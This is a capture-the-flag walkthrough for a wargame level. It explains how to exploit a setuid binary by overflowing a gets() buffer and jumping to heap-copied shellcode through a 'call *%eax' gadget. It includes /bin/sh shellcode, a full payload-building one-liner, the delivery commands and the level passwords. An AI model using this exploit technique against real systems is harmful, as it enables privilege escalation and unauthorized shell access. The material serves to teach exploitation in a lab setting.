# Level 02 — Walkthrough

---

## Overview

| | |
|---|---|
| **Binary** | `level2` |
| **User** | `level2` |
| **Goal user** | `level3` |
| **Protections** | Stack non-executable (NX); a filter forbidding return addresses within the stack range |
| **Password (current level)** | `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77` |
| **Password (obtained)** | `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02` |

**Objective:** exploit the `level2` binary (setuid `level3`) so as to obtain a shell and read `/home/user/level3/.pass`.

---

## 1. Reconnaissance

The vulnerable function, here named `p`, receives input by way of `gets()` into a stack buffer, then examines the return address before proceeding further — a precaution which shall prove the level's principal obstacle.

---

## 2. Static Analysis

Disassembly of `p`:

```gdb
disas p
```

```asm
0x080484d4 <+0>:    push   %ebp
0x080484d5 <+1>:    mov    %esp,%ebp
0x080484d7 <+3>:    sub    $0x68,%esp
...
0x080484e7 <+19>:   lea    -0x4c(%ebp),%eax      ; buffer = ebp-0x4c (76 bytes)
0x080484ed <+25>:   call   0x80483c0 <gets@plt>
0x080484f2 <+30>:   mov    0x4(%ebp),%eax        ; retrieves the return address
0x080484f5 <+33>:   mov    %eax,-0xc(%ebp)
0x080484f8 <+36>:   mov    -0xc(%ebp),%eax
0x080484fb <+39>:   and    $0xb0000000,%eax
0x08048500 <+44>:   cmp    $0xb0000000,%eax
0x08048505 <+49>:   jne    0x8048527 <p+83>      ; if not stack -> continue
...                                              ; otherwise printf + exit
0x08048527 <+83>:   lea    -0x4c(%ebp),%eax
0x0804852d <+89>:   call   0x80483f0 <puts@plt>
0x08048538 <+100>:  call   0x80483e0 <strdup@plt>
0x0804853d <+105>:  leave
0x0804853e <+106>:  ret
```

Points of note:

- A buffer of **76 bytes** (`ebp-0x4c`).
- `gets()` again admits an overflow.
- **Filter:** should the return address fall within the stack's range (`0xb.......`), the program halts.
- Following the filter, `puts` is called, then `strdup`.
- `strdup` allocates upon the **heap** and there copies the buffer; the resulting pointer remains in **`%eax`**.

The principal obstacle is thus twofold: the stack is non-executable, and the filter forbids returning upon it. Shellcode may not, therefore, be placed upon the stack and returned to directly.

---

## 3. Dynamic Analysis

A gadget capable of transferring control to the pointer held in `%eax` was sought:

```bash
objdump -d level2 | grep -E "call.*%eax|jmp.*%eax"
```

yielding:

```
0x080484cf : call *%eax
```

Confirmation under GDB, once the payload had been assembled:

```gdb
gdb ./level2
(gdb) b *0x0804853d
(gdb) run < /tmp/payload

(gdb) print /x $eax          # pointer to the shellcode on the heap
(gdb) x/wx $ebp+4            # should contain 0x080484cf
(gdb) x/20i $eax             # disassembly of the shellcode
(gdb) c
```

---

## 4. Vulnerability

An unbounded `gets()` upon a stack buffer, coupled with an insufficient filter: the program forbids returning *onto* the stack, but neglects to forbid returning onto the *heap* — whither `strdup` conveniently deposits a copy of our buffer.

---

## 5. Exploitation

**Strategy — return-to-heap:**

1. Place shellcode at the head of the buffer.
2. `strdup` copies it automatically onto the heap.
3. The pointer to that shellcode resides, at the moment of return, in `%eax`.
4. A `call *%eax` gadget within the binary is located.
5. The return address is overwritten with the address of that gadget.

**Offset:** buffer (76 bytes) + saved EBP (4 bytes) + return address (4 bytes) = **80 bytes** to reach the return address.

**Payload structure** (total 84 bytes):

```
[ shellcode (25 bytes) ]
[ padding (51 bytes)   ]
[ fake EBP (4 bytes)   ]
[ gadget  (4 bytes)    ]
```

The shellcode employed:

```asm
xor  %eax, %eax
xor  %edx, %edx          ; edx = 0 (envp must be NULL)
push %eax
push $0x68732f2f         ; "//sh"
push $0x6e69622f         ; "/bin"
mov  %esp, %ebx
push %eax
push %ebx
mov  %esp, %ecx
mov  $0xb, %al
int  $0x80
```

in hexadecimal form:

```
\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

Regarding the fake EBP: the instruction `leave` performs `mov %ebp, %esp; pop %ebp`. The saved EBP must therefore be overwritten with a valid stack address, lest the stack become unfit for the shellcode's subsequent `push` operations. The address employed, found by means of GDB, was `0xbffff728`.

The complete payload:

```bash
python -c 'import sys; sys.stdout.write(
"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" +
"A"*51 +
"\x28\xf7\xff\xbf" +
"\xcf\x84\x04\x08"
)' > /tmp/payload
```

Its size was verified:

```bash
wc -c /tmp/payload
# should show 84
```

Delivered thus:

```bash
(cat /tmp/payload; cat) | ./level2
```

---

## 6. Result

Once the shell is obtained:

```bash
id
cat /home/user/level3/.pass
```

| Step | Description |
|------|-------------|
| 1 | Buffer overflow via `gets` |
| 2 | Shellcode placed at the start of the buffer |
| 3 | `strdup` copies the shellcode onto the heap and deposits the pointer in `%eax` |
| 4 | Return address overwritten with `0x080484cf` (`call *%eax`) |
| 5 | Execution of the shellcode — shell obtained |

---

## Notes & Lessons

This level, called **return-to-heap**, demonstrates how a filter guarding one region of memory (the stack) may prove insufficient once a second region (the heap) is left unguarded, and how a program's own conveniences — here, `strdup` — may be turned against it.
